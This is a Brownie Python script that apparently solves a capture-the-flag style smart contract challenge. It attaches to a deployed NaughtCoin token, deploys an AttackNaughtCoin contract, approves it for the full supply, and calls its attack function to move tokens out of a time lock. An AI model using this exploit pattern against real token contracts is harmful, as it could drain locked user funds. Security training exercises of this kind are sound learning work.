from scripts.helpful_scripts import POINT_ONE, TEN, get_account, ONE
from brownie import NaughtCoin, AttackNaughtCoin, network, Contract
from web3 import Web3
from web3.auto import w3


def deploy_NaughtCoin(player):
    account = get_account()
    coin = NaughtCoin.deploy(
        player,
        {"from": account},
    )
    return coin


def deploy_AttackNaughtCoin(coin):
    account = get_account()
    attack = AttackNaughtCoin.deploy(
        coin,
        {"from": account},
    )
    return attack


def main():
    print(network.show_active())
    account = get_account()

    # coin = deploy_NaughtCoin(account)

    coin_address = "0x657fd44dC5b7D600d0c804C4f512A6a977935534"
    coin = Contract.from_abi(NaughtCoin._name, coin_address, NaughtCoin.abi)

    attackContract = deploy_AttackNaughtCoin(coin)

    print(f"Balance? : {coin.balanceOf(account)}")

    coin.approve(attackContract, coin.INITIAL_SUPPLY(), {"from": account})

    attackContract.attack(coin.INITIAL_SUPPLY(), {"from": account})
    print(f"Balance? : {coin.balanceOf(account)}")
